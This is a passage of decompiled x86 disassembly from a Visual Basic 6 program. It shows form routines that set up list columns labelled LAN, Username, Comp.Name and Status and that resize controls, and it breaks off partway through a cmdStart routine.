008CEA1A: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEA1F: lea esi, var_7C
008CEA22: mov edi, esp
008CEA24: movsd 
008CEA25: movsd 
008CEA26: movsd 
008CEA27: movsd 
008CEA28: push 00000010h
008CEA2A: pop eax
008CEA2B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEA30: lea esi, var_0000009C
008CEA36: mov edi, esp
008CEA38: movsd 
008CEA39: movsd 
008CEA3A: movsd 
008CEA3B: movsd 
008CEA3C: push 00000004h
008CEA3E: push 00000002h
008CEA40: push 00445534h
008CEA45: push 00000000h
008CEA47: push 00000019h
008CEA49: mov eax, [ebp+08h]
008CEA4C: mov eax, [eax]
008CEA4E: push [ebp+08h]
008CEA51: call [eax+00000314h]
008CEA57: push eax
008CEA58: lea eax, var_18
008CEA5B: push eax
008CEA5C: call 00410A84h ; Set (object)
008CEA61: push eax
008CEA62: lea eax, var_2C
008CEA65: push eax
008CEA66: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CEA6B: add esp, 00000010h
008CEA6E: push eax
008CEA6F: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CEA74: push eax
008CEA75: lea eax, var_1C
008CEA78: push eax
008CEA79: call 00410A84h ; Set (object)
008CEA7E: push eax
008CEA7F: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CEA84: add esp, 0000004Ch
008CEA87: lea eax, var_1C
008CEA8A: push eax
008CEA8B: lea eax, var_18
008CEA8E: push eax
008CEA8F: push 00000002h
008CEA91: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CEA96: add esp, 0000000Ch
008CEA99: lea ecx, var_2C
008CEA9C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CEAA1: mov var_34, 80020004h
008CEAA8: mov var_3C, 0000000Ah
008CEAAF: mov var_54, 80020004h
008CEAB6: mov var_5C, 0000000Ah
008CEABD: mov var_74, 0044672Ch ; LAN
008CEAC4: mov var_7C, 00000008h
008CEACB: mov var_00000094, 00000708h
008CEAD5: mov var_0000009C, 00000002h
008CEADF: push 00000010h
008CEAE1: pop eax
008CEAE2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEAE7: lea esi, var_3C
008CEAEA: mov edi, esp
008CEAEC: movsd 
008CEAED: movsd 
008CEAEE: movsd 
008CEAEF: movsd 
008CEAF0: push 00000010h
008CEAF2: pop eax
008CEAF3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEAF8: lea esi, var_5C
008CEAFB: mov edi, esp
008CEAFD: movsd 
008CEAFE: movsd 
008CEAFF: movsd 
008CEB00: movsd 
008CEB01: push 00000010h
008CEB03: pop eax
008CEB04: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEB09: lea esi, var_7C
008CEB0C: mov edi, esp
008CEB0E: movsd 
008CEB0F: movsd 
008CEB10: movsd 
008CEB11: movsd 
008CEB12: push 00000010h
008CEB14: pop eax
008CEB15: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEB1A: lea esi, var_0000009C
008CEB20: mov edi, esp
008CEB22: movsd 
008CEB23: movsd 
008CEB24: movsd 
008CEB25: movsd 
008CEB26: push 00000004h
008CEB28: push 00000002h
008CEB2A: push 00445534h
008CEB2F: push 00000000h
008CEB31: push 00000019h
008CEB33: mov eax, [ebp+08h]
008CEB36: mov eax, [eax]
008CEB38: push [ebp+08h]
008CEB3B: call [eax+00000314h]
008CEB41: push eax
008CEB42: lea eax, var_18
008CEB45: push eax
008CEB46: call 00410A84h ; Set (object)
008CEB4B: push eax
008CEB4C: lea eax, var_2C
008CEB4F: push eax
008CEB50: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CEB55: add esp, 00000010h
008CEB58: push eax
008CEB59: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CEB5E: push eax
008CEB5F: lea eax, var_1C
008CEB62: push eax
008CEB63: call 00410A84h ; Set (object)
008CEB68: push eax
008CEB69: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CEB6E: add esp, 0000004Ch
008CEB71: lea eax, var_1C
008CEB74: push eax
008CEB75: lea eax, var_18
008CEB78: push eax
008CEB79: push 00000002h
008CEB7B: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CEB80: add esp, 0000000Ch
008CEB83: lea ecx, var_2C
008CEB86: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CEB8B: mov var_34, 80020004h
008CEB92: mov var_3C, 0000000Ah
008CEB99: mov var_54, 80020004h
008CEBA0: mov var_5C, 0000000Ah
008CEBA7: mov var_74, 00446744h ; Username
008CEBAE: mov var_7C, 00000008h
008CEBB5: mov var_00000094, 00000898h
008CEBBF: mov var_0000009C, 00000002h
008CEBC9: push 00000010h
008CEBCB: pop eax
008CEBCC: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEBD1: lea esi, var_3C
008CEBD4: mov edi, esp
008CEBD6: movsd 
008CEBD7: movsd 
008CEBD8: movsd 
008CEBD9: movsd 
008CEBDA: push 00000010h
008CEBDC: pop eax
008CEBDD: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEBE2: lea esi, var_5C
008CEBE5: mov edi, esp
008CEBE7: movsd 
008CEBE8: movsd 
008CEBE9: movsd 
008CEBEA: movsd 
008CEBEB: push 00000010h
008CEBED: pop eax
008CEBEE: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEBF3: lea esi, var_7C
008CEBF6: mov edi, esp
008CEBF8: movsd 
008CEBF9: movsd 
008CEBFA: movsd 
008CEBFB: movsd 
008CEBFC: push 00000010h
008CEBFE: pop eax
008CEBFF: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEC04: lea esi, var_0000009C
008CEC0A: mov edi, esp
008CEC0C: movsd 
008CEC0D: movsd 
008CEC0E: movsd 
008CEC0F: movsd 
008CEC10: push 00000004h
008CEC12: push 00000002h
008CEC14: push 00445534h
008CEC19: push 00000000h
008CEC1B: push 00000019h
008CEC1D: mov eax, [ebp+08h]
008CEC20: mov eax, [eax]
008CEC22: push [ebp+08h]
008CEC25: call [eax+00000314h]
008CEC2B: push eax
008CEC2C: lea eax, var_18
008CEC2F: push eax
008CEC30: call 00410A84h ; Set (object)
008CEC35: push eax
008CEC36: lea eax, var_2C
008CEC39: push eax
008CEC3A: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CEC3F: add esp, 00000010h
008CEC42: push eax
008CEC43: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CEC48: push eax
008CEC49: lea eax, var_1C
008CEC4C: push eax
008CEC4D: call 00410A84h ; Set (object)
008CEC52: push eax
008CEC53: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CEC58: add esp, 0000004Ch
008CEC5B: lea eax, var_1C
008CEC5E: push eax
008CEC5F: lea eax, var_18
008CEC62: push eax
008CEC63: push 00000002h
008CEC65: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CEC6A: add esp, 0000000Ch
008CEC6D: lea ecx, var_2C
008CEC70: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CEC75: mov var_34, 80020004h
008CEC7C: mov var_3C, 0000000Ah
008CEC83: mov var_54, 80020004h
008CEC8A: mov var_5C, 0000000Ah
008CEC91: mov var_74, 0044675Ch ; Comp.Name
008CEC98: mov var_7C, 00000008h
008CEC9F: mov var_00000094, 00000898h
008CECA9: mov var_0000009C, 00000002h
008CECB3: push 00000010h
008CECB5: pop eax
008CECB6: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CECBB: lea esi, var_3C
008CECBE: mov edi, esp
008CECC0: movsd 
008CECC1: movsd 
008CECC2: movsd 
008CECC3: movsd 
008CECC4: push 00000010h
008CECC6: pop eax
008CECC7: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CECCC: lea esi, var_5C
008CECCF: mov edi, esp
008CECD1: movsd 
008CECD2: movsd 
008CECD3: movsd 
008CECD4: movsd 
008CECD5: push 00000010h
008CECD7: pop eax
008CECD8: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CECDD: lea esi, var_7C
008CECE0: mov edi, esp
008CECE2: movsd 
008CECE3: movsd 
008CECE4: movsd 
008CECE5: movsd 
008CECE6: push 00000010h
008CECE8: pop eax
008CECE9: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CECEE: lea esi, var_0000009C
008CECF4: mov edi, esp
008CECF6: movsd 
008CECF7: movsd 
008CECF8: movsd 
008CECF9: movsd 
008CECFA: push 00000004h
008CECFC: push 00000002h
008CECFE: push 00445534h
008CED03: push 00000000h
008CED05: push 00000019h
008CED07: mov eax, [ebp+08h]
008CED0A: mov eax, [eax]
008CED0C: push [ebp+08h]
008CED0F: call [eax+00000314h]
008CED15: push eax
008CED16: lea eax, var_18
008CED19: push eax
008CED1A: call 00410A84h ; Set (object)
008CED1F: push eax
008CED20: lea eax, var_2C
008CED23: push eax
008CED24: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CED29: add esp, 00000010h
008CED2C: push eax
008CED2D: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CED32: push eax
008CED33: lea eax, var_1C
008CED36: push eax
008CED37: call 00410A84h ; Set (object)
008CED3C: push eax
008CED3D: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CED42: add esp, 0000004Ch
008CED45: lea eax, var_1C
008CED48: push eax
008CED49: lea eax, var_18
008CED4C: push eax
008CED4D: push 00000002h
008CED4F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CED54: add esp, 0000000Ch
008CED57: lea ecx, var_2C
008CED5A: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CED5F: mov var_34, 80020004h
008CED66: mov var_3C, 0000000Ah
008CED6D: mov var_54, 80020004h
008CED74: mov var_5C, 0000000Ah
008CED7B: mov var_74, 004468A0h ; Status
008CED82: mov var_7C, 00000008h
008CED89: mov var_00000094, 00000DACh
008CED93: mov var_0000009C, 00000002h
008CED9D: push 00000010h
008CED9F: pop eax
008CEDA0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEDA5: lea esi, var_3C
008CEDA8: mov edi, esp
008CEDAA: movsd 
008CEDAB: movsd 
008CEDAC: movsd 
008CEDAD: movsd 
008CEDAE: push 00000010h
008CEDB0: pop eax
008CEDB1: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEDB6: lea esi, var_5C
008CEDB9: mov edi, esp
008CEDBB: movsd 
008CEDBC: movsd 
008CEDBD: movsd 
008CEDBE: movsd 
008CEDBF: push 00000010h
008CEDC1: pop eax
008CEDC2: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEDC7: lea esi, var_7C
008CEDCA: mov edi, esp
008CEDCC: movsd 
008CEDCD: movsd 
008CEDCE: movsd 
008CEDCF: movsd 
008CEDD0: push 00000010h
008CEDD2: pop eax
008CEDD3: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEDD8: lea esi, var_0000009C
008CEDDE: mov edi, esp
008CEDE0: movsd 
008CEDE1: movsd 
008CEDE2: movsd 
008CEDE3: movsd 
008CEDE4: push 00000004h
008CEDE6: push 00000002h
008CEDE8: push 00445534h
008CEDED: push 00000000h
008CEDEF: push 00000019h
008CEDF1: mov eax, [ebp+08h]
008CEDF4: mov eax, [eax]
008CEDF6: push [ebp+08h]
008CEDF9: call [eax+00000314h]
008CEDFF: push eax
008CEE00: lea eax, var_18
008CEE03: push eax
008CEE04: call 00410A84h ; Set (object)
008CEE09: push eax
008CEE0A: lea eax, var_2C
008CEE0D: push eax
008CEE0E: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CEE13: add esp, 00000010h
008CEE16: push eax
008CEE17: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CEE1C: push eax
008CEE1D: lea eax, var_1C
008CEE20: push eax
008CEE21: call 00410A84h ; Set (object)
008CEE26: push eax
008CEE27: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CEE2C: add esp, 0000004Ch
008CEE2F: lea eax, var_1C
008CEE32: push eax
008CEE33: lea eax, var_18
008CEE36: push eax
008CEE37: push 00000002h
008CEE39: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CEE3E: add esp, 0000000Ch
008CEE41: lea ecx, var_2C
008CEE44: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CEE49: mov var_04, 00000000h
008CEE50: push 008CEE73h
008CEE55: jmp 8CEE72h
008CEE57: lea eax, var_1C
008CEE5A: push eax
008CEE5B: lea eax, var_18
008CEE5E: push eax
008CEE5F: push 00000002h
008CEE61: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CEE66: add esp, 0000000Ch
008CEE69: lea ecx, var_2C
008CEE6C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CEE71: ret 
End Sub

Private sub Form__8CEE92
008CEE92: push ebp
008CEE93: mov ebp, esp
008CEE95: sub esp, 00000018h
008CEE98: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CEE9D: mov eax, fs:[00h]
008CEEA3: push eax
008CEEA4: mov fs:[00000000h], esp
008CEEAB: mov eax, 000000FCh
008CEEB0: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CEEB5: push ebx
008CEEB6: push esi
008CEEB7: push edi
008CEEB8: mov var_18, esp
008CEEBB: mov var_14, 0040F948h
008CEEC2: mov eax, [ebp+08h]
008CEEC5: and eax, 00000001h
008CEEC8: mov var_10, eax
008CEECB: mov eax, [ebp+08h]
008CEECE: and al, FEh
008CEED0: mov [ebp+08h], eax
008CEED3: mov var_0C, 00000000h
008CEEDA: mov eax, [ebp+08h]
008CEEDD: mov eax, [eax]
008CEEDF: push [ebp+08h]
008CEEE2: call [eax+04h]
008CEEE5: mov var_04, 00000001h
008CEEEC: mov var_04, 00000002h
008CEEF3: push FFFFFFFFh
008CEEF5: call 00410A60h ; On Error ...
008CEEFA: mov var_04, 00000003h
008CEF01: push 00000000h
008CEF03: push 80010006h
008CEF08: mov eax, [ebp+08h]
008CEF0B: mov eax, [eax]
008CEF0D: push [ebp+08h]
008CEF10: call [eax+00000318h]
008CEF16: push eax
008CEF17: lea eax, var_24
008CEF1A: push eax
008CEF1B: call 00410A84h ; Set (object)
008CEF20: push eax
008CEF21: lea eax, var_40
008CEF24: push eax
008CEF25: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CEF2A: add esp, 00000010h
008CEF2D: fldz 
008CEF2F: fstp real4 ptr var_68
008CEF32: mov var_70, 00000004h
008CEF39: and var_00000088, 00000000h
008CEF40: mov var_00000090, 00000002h
008CEF4A: lea eax, var_000000E4
008CEF50: push eax
008CEF51: mov eax, [ebp+08h]
008CEF54: mov eax, [eax]
008CEF56: push [ebp+08h]
008CEF59: call [eax+00000080h]
008CEF5F: fclex 
008CEF61: mov var_000000EC, eax
008CEF67: cmp var_000000EC, 00000000h
008CEF6E: jnl 8CEF90h
008CEF70: push 00000080h
008CEF75: push 00448548h
008CEF7A: push [ebp+08h]
008CEF7D: push var_000000EC
008CEF83: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008CEF88: mov var_00000108, eax
008CEF8E: jmp 8CEF97h
008CEF90: and var_00000108, 00000000h
008CEF97: fld real4 ptr var_000000E4
008CEF9D: fsub real4 ptr [00402B7Ch]
008CEFA3: fstp real4 ptr var_000000A8
008CEFA9: fstsw ax
008CEFAB: test al, 0Dh
008CEFAD: jnz 008CF470h
008CEFB3: mov var_000000B0, 00000004h
008CEFBD: lea eax, var_000000E8
008CEFC3: push eax
008CEFC4: mov eax, [ebp+08h]
008CEFC7: mov eax, [eax]
008CEFC9: push [ebp+08h]
008CEFCC: call [eax+00000088h]
008CEFD2: fclex 
008CEFD4: mov var_000000F0, eax
008CEFDA: cmp var_000000F0, 00000000h
008CEFE1: jnl 8CF003h
008CEFE3: push 00000088h
008CEFE8: push 00448548h
008CEFED: push [ebp+08h]
008CEFF0: push var_000000F0
008CEFF6: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008CEFFB: mov var_0000010C, eax
008CF001: jmp 8CF00Ah
008CF003: and var_0000010C, 00000000h
008CF00A: lea eax, var_40
008CF00D: push eax
008CF00E: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF013: fsubr real4 ptr var_000000E8
008CF019: fsub real4 ptr [00402B70h]
008CF01F: fstp real4 ptr var_000000C8
008CF025: fstsw ax
008CF027: test al, 0Dh
008CF029: jnz 008CF470h
008CF02F: mov var_000000D0, 00000004h
008CF039: push 00000010h
008CF03B: pop eax
008CF03C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF041: lea esi, var_70
008CF044: mov edi, esp
008CF046: movsd 
008CF047: movsd 
008CF048: movsd 
008CF049: movsd 
008CF04A: push 00000010h
008CF04C: pop eax
008CF04D: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF052: lea esi, var_00000090
008CF058: mov edi, esp
008CF05A: movsd 
008CF05B: movsd 
008CF05C: movsd 
008CF05D: movsd 
008CF05E: push 00000010h
008CF060: pop eax
008CF061: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF066: lea esi, var_000000B0
008CF06C: mov edi, esp
008CF06E: movsd 
008CF06F: movsd 
008CF070: movsd 
008CF071: movsd 
008CF072: push 00000010h
008CF074: pop eax
008CF075: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF07A: lea esi, var_000000D0
008CF080: mov edi, esp
008CF082: movsd 
008CF083: movsd 
008CF084: movsd 
008CF085: movsd 
008CF086: push 00000004h
008CF088: push 80011002h
008CF08D: mov eax, [ebp+08h]
008CF090: mov eax, [eax]
008CF092: push [ebp+08h]
008CF095: call [eax+00000314h]
008CF09B: push eax
008CF09C: lea eax, var_28
008CF09F: push eax
008CF0A0: call 00410A84h ; Set (object)
008CF0A5: push eax
008CF0A6: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CF0AB: add esp, 0000004Ch
008CF0AE: lea eax, var_28
008CF0B1: push eax
008CF0B2: lea eax, var_24
008CF0B5: push eax
008CF0B6: push 00000002h
008CF0B8: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF0BD: add esp, 0000000Ch
008CF0C0: lea ecx, var_40
008CF0C3: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008CF0C8: mov var_04, 00000004h
008CF0CF: push 00000000h
008CF0D1: push 80010006h
008CF0D6: mov eax, [ebp+08h]
008CF0D9: mov eax, [eax]
008CF0DB: push [ebp+08h]
008CF0DE: call [eax+00000314h]
008CF0E4: push eax
008CF0E5: lea eax, var_28
008CF0E8: push eax
008CF0E9: call 00410A84h ; Set (object)
008CF0EE: push eax
008CF0EF: lea eax, var_50
008CF0F2: push eax
008CF0F3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF0F8: add esp, 00000010h
008CF0FB: fldz 
008CF0FD: fstp real4 ptr var_68
008CF100: mov var_70, 00000004h
008CF107: push 00000000h
008CF109: push 80010004h
008CF10E: mov eax, [ebp+08h]
008CF111: mov eax, [eax]
008CF113: push [ebp+08h]
008CF116: call [eax+00000314h]
008CF11C: push eax
008CF11D: lea eax, var_24
008CF120: push eax
008CF121: call 00410A84h ; Set (object)
008CF126: push eax
008CF127: lea eax, var_40
008CF12A: push eax
008CF12B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF130: add esp, 00000010h
008CF133: push eax
008CF134: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF139: fstp real4 ptr var_00000110
008CF13F: lea eax, var_50
008CF142: push eax
008CF143: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF148: fadd real4 ptr var_00000110
008CF14E: fadd real4 ptr [00402BA8h]
008CF154: fstp real4 ptr var_00000088
008CF15A: fstsw ax
008CF15C: test al, 0Dh
008CF15E: jnz 008CF470h
008CF164: mov var_00000090, 00000004h
008CF16E: lea eax, var_000000E4
008CF174: push eax
008CF175: mov eax, [ebp+08h]
008CF178: mov eax, [eax]
008CF17A: push [ebp+08h]
008CF17D: call [eax+00000080h]
008CF183: fclex 
008CF185: mov var_000000EC, eax
008CF18B: cmp var_000000EC, 00000000h
008CF192: jnl 8CF1B4h
008CF194: push 00000080h
008CF199: push 00448548h
008CF19E: push [ebp+08h]
008CF1A1: push var_000000EC
008CF1A7: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
008CF1AC: mov var_00000114, eax
008CF1B2: jmp 8CF1BBh
008CF1B4: and var_00000114, 00000000h
008CF1BB: fld real4 ptr var_000000E4
008CF1C1: fsub real4 ptr [00402B7Ch]
008CF1C7: fstp real4 ptr var_000000A8
008CF1CD: fstsw ax
008CF1CF: test al, 0Dh
008CF1D1: jnz 008CF470h
008CF1D7: mov var_000000B0, 00000004h
008CF1E1: push 00000000h
008CF1E3: push 80010006h
008CF1E8: mov eax, [ebp+08h]
008CF1EB: mov eax, [eax]
008CF1ED: push [ebp+08h]
008CF1F0: call [eax+00000318h]
008CF1F6: push eax
008CF1F7: lea eax, var_2C
008CF1FA: push eax
008CF1FB: call 00410A84h ; Set (object)
008CF200: push eax
008CF201: lea eax, var_60
008CF204: push eax
008CF205: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF20A: add esp, 00000010h
008CF20D: push eax
008CF20E: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF213: fstp real4 ptr var_000000C8
008CF219: mov var_000000D0, 00000004h
008CF223: push 00000010h
008CF225: pop eax
008CF226: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF22B: lea esi, var_70
008CF22E: mov edi, esp
008CF230: movsd 
008CF231: movsd 
008CF232: movsd 
008CF233: movsd 
008CF234: push 00000010h
008CF236: pop eax
008CF237: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF23C: lea esi, var_00000090
008CF242: mov edi, esp
008CF244: movsd 
008CF245: movsd 
008CF246: movsd 
008CF247: movsd 
008CF248: push 00000010h
008CF24A: pop eax
008CF24B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF250: lea esi, var_000000B0
008CF256: mov edi, esp
008CF258: movsd 
008CF259: movsd 
008CF25A: movsd 
008CF25B: movsd 
008CF25C: push 00000010h
008CF25E: pop eax
008CF25F: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF264: lea esi, var_000000D0
008CF26A: mov edi, esp
008CF26C: movsd 
008CF26D: movsd 
008CF26E: movsd 
008CF26F: movsd 
008CF270: push 00000004h
008CF272: push 80011001h
008CF277: mov eax, [ebp+08h]
008CF27A: mov eax, [eax]
008CF27C: push [ebp+08h]
008CF27F: call [eax+00000318h]
008CF285: push eax
008CF286: lea eax, var_30
008CF289: push eax
008CF28A: call 00410A84h ; Set (object)
008CF28F: push eax
008CF290: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CF295: add esp, 0000004Ch
008CF298: lea eax, var_30
008CF29B: push eax
008CF29C: lea eax, var_2C
008CF29F: push eax
008CF2A0: lea eax, var_28
008CF2A3: push eax
008CF2A4: lea eax, var_24
008CF2A7: push eax
008CF2A8: push 00000004h
008CF2AA: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF2AF: add esp, 00000014h
008CF2B2: lea eax, var_60
008CF2B5: push eax
008CF2B6: lea eax, var_50
008CF2B9: push eax
008CF2BA: lea eax, var_40
008CF2BD: push eax
008CF2BE: push 00000003h
008CF2C0: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CF2C5: add esp, 00000010h
008CF2C8: mov var_04, 00000005h
008CF2CF: push 00000000h
008CF2D1: push 80010005h
008CF2D6: mov eax, [ebp+08h]
008CF2D9: mov eax, [eax]
008CF2DB: push [ebp+08h]
008CF2DE: call [eax+00000318h]
008CF2E4: push eax
008CF2E5: lea eax, var_28
008CF2E8: push eax
008CF2E9: call 00410A84h ; Set (object)
008CF2EE: push eax
008CF2EF: lea eax, var_50
008CF2F2: push eax
008CF2F3: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF2F8: add esp, 00000010h
008CF2FB: push 00000000h
008CF2FD: push 80010005h
008CF302: mov eax, [ebp+08h]
008CF305: mov eax, [eax]
008CF307: push [ebp+08h]
008CF30A: call [eax+0000031Ch]
008CF310: push eax
008CF311: lea eax, var_2C
008CF314: push eax
008CF315: call 00410A84h ; Set (object)
008CF31A: push eax
008CF31B: lea eax, var_60
008CF31E: push eax
008CF31F: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF324: add esp, 00000010h
008CF327: push 00000000h
008CF329: push 80010003h
008CF32E: mov eax, [ebp+08h]
008CF331: mov eax, [eax]
008CF333: push [ebp+08h]
008CF336: call [eax+00000318h]
008CF33C: push eax
008CF33D: lea eax, var_24
008CF340: push eax
008CF341: call 00410A84h ; Set (object)
008CF346: push eax
008CF347: lea eax, var_40
008CF34A: push eax
008CF34B: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CF350: add esp, 00000010h
008CF353: push eax
008CF354: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF359: fstp real4 ptr var_00000118
008CF35F: lea eax, var_50
008CF362: push eax
008CF363: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF368: fadd real4 ptr var_00000118
008CF36E: fstsw ax
008CF370: test al, 0Dh
008CF372: jnz 008CF470h
008CF378: fstp real4 ptr var_0000011C
008CF37E: lea eax, var_60
008CF381: push eax
008CF382: call 004107EAh ; msvbvm60.dll.__vbaR4Var
008CF387: fsubr real4 ptr var_0000011C
008CF38D: fsub real4 ptr [00402BA4h]
008CF393: fstp real4 ptr var_68
008CF396: fstsw ax
008CF398: test al, 0Dh
008CF39A: jnz 008CF470h
008CF3A0: mov var_70, 00000004h
008CF3A7: push 00000010h
008CF3A9: pop eax
008CF3AA: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CF3AF: lea esi, var_70
008CF3B2: mov edi, esp
008CF3B4: movsd 
008CF3B5: movsd 
008CF3B6: movsd 
008CF3B7: movsd 
008CF3B8: push 00000001h
008CF3BA: push 80011002h
008CF3BF: mov eax, [ebp+08h]
008CF3C2: mov eax, [eax]
008CF3C4: push [ebp+08h]
008CF3C7: call [eax+0000031Ch]
008CF3CD: push eax
008CF3CE: lea eax, var_30
008CF3D1: push eax
008CF3D2: call 00410A84h ; Set (object)
008CF3D7: push eax
008CF3D8: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CF3DD: add esp, 0000001Ch
008CF3E0: lea eax, var_30
008CF3E3: push eax
008CF3E4: lea eax, var_2C
008CF3E7: push eax
008CF3E8: lea eax, var_28
008CF3EB: push eax
008CF3EC: lea eax, var_24
008CF3EF: push eax
008CF3F0: push 00000004h
008CF3F2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF3F7: add esp, 00000014h
008CF3FA: lea eax, var_60
008CF3FD: push eax
008CF3FE: lea eax, var_50
008CF401: push eax
008CF402: lea eax, var_40
008CF405: push eax
008CF406: push 00000003h
008CF408: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CF40D: add esp, 00000010h
008CF410: mov var_10, 00000000h
008CF417: wait 
008CF418: push 008CF451h
008CF41D: jmp 8CF450h
008CF41F: lea eax, var_30
008CF422: push eax
008CF423: lea eax, var_2C
008CF426: push eax
008CF427: lea eax, var_28
008CF42A: push eax
008CF42B: lea eax, var_24
008CF42E: push eax
008CF42F: push 00000004h
008CF431: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008CF436: add esp, 00000014h
008CF439: lea eax, var_60
008CF43C: push eax
008CF43D: lea eax, var_50
008CF440: push eax
008CF441: lea eax, var_40
008CF444: push eax
008CF445: push 00000003h
008CF447: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008CF44C: add esp, 00000010h
008CF44F: ret 
End Sub

Private sub cmdStart__8CD655
008CD655: push ebp
008CD656: mov ebp, esp
008CD658: sub esp, 0000000Ch
008CD65B: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008CD660: mov eax, fs:[00h]
008CD666: push eax
008CD667: mov fs:[00000000h], esp
008CD66E: mov eax, 0000011Ch
008CD673: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008CD678: push ebx
008CD679: push esi
008CD67A: push edi
008CD67B: mov var_0C, esp
008CD67E: mov var_08, 0040F918h
008CD685: mov eax, [ebp+08h]
008CD688: and eax, 00000001h
008CD68B: mov var_04, eax
008CD68E: mov eax, [ebp+08h]
008CD691: and al, FEh
008CD693: mov [ebp+08h], eax
008CD696: mov eax, [ebp+08h]
008CD699: mov eax, [eax]
008CD69B: push [ebp+08h]
008CD69E: call [eax+04h]
008CD6A1: push 00000000h
008CD6A3: push 00000003h
008CD6A5: push 00440E48h
008CD6AA: push 00000000h
008CD6AC: push 00000018h
008CD6AE: mov eax, [ebp+08h]
008CD6B1: mov eax, [eax]
008CD6B3: push [ebp+08h]
008CD6B6: call [eax+00000314h]
008CD6BC: push eax
008CD6BD: lea eax, var_40
008CD6C0: push eax
008CD6C1: call 00410A84h ; Set (object)
008CD6C6: push eax
008CD6C7: lea eax, var_58
008CD6CA: push eax
008CD6CB: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008CD6D0: add esp, 00000010h
008CD6D3: push eax
008CD6D4: call 00410A30h ; msvbvm60.dll.__vbaCastObjVar
008CD6D9: push eax
008CD6DA: lea eax, var_44
008CD6DD: push eax
008CD6DE: call 00410A84h ; Set (object)
008CD6E3: push eax
008CD6E4: call 00410A2Ah ; msvbvm60.dll.__vbaLateIdCall
008CD6E9: add esp, 0000000Ch
008CD6EC: lea eax, var_44
